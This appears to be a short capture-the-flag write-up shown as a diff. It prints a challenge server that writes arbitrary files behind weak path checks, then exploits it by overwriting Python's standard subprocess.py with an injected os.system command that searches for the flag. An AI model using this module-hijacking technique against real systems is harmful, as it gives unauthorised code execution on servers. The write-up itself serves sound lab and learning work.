@@ -1,0 +1,57 @@
+This is the server python file
+--------------------------------
+
+import subprocess
+from base64 import b64decode as d
+while True:
+	print("[1] Write to a file\n[2] Get the flag\n[3] Exit")
+	try:
+		inp = int(input("Choice: ").strip())
+	except:
+		print("Invalid input!")
+		exit(0)
+	if inp == 1:
+		file = input("Enter file name: ").strip()
+		assert file.count('.') <= 2 # Why do you need more?
+		assert "/proc" not in file # Why do you need to write there?
+		assert "/bin" not in file # Why do you need to write there? 
+		assert "\n" not in file # Why do you need these?
+		assert "chall" not in file # Don't be overwriting my files!
+		try: 
+			f = open(file,'w')
+		except:
+			print("Error! Maybe the file does not exist?")
+
+		f.write(input("Data: ").strip())
+		f.close()
+		print("Data written sucessfully!")
+		
+	if inp == 2:
+		flag = subprocess.run(["cat","fake_flag.txt"],capture_output=True) # You actually thought I would give the flag?
+		print(flag.stdout.strip())
+
+That works
+-----------
+[1] Write to a file
+[2] Get the flag
+[3] Exit
+Choice: 
+
+What I want to do is write the subprocess python import file.
+/usr/lib/python3.10/subprocess.py
+            (or)
+/usr/local/lib/python3.10/subprocess.py
+
+But I don't know about the python version in server. So, I need to be patient to test the python version 1 by 1
+
+[1] Write to a file
+[2] Get the flag
+[3] Exit
+Choice: 1
+Enter file name: /usr/local/lib/python3.10/subprocess.py
+Data: import os;os.system("find / -name 'flag.txt' 2>/dev/null")
+Data written sucessfully!
+
+Finally, I can write in subprocess.py file
+
+Next time, I run the script, I can read the location of the flag.txt file.
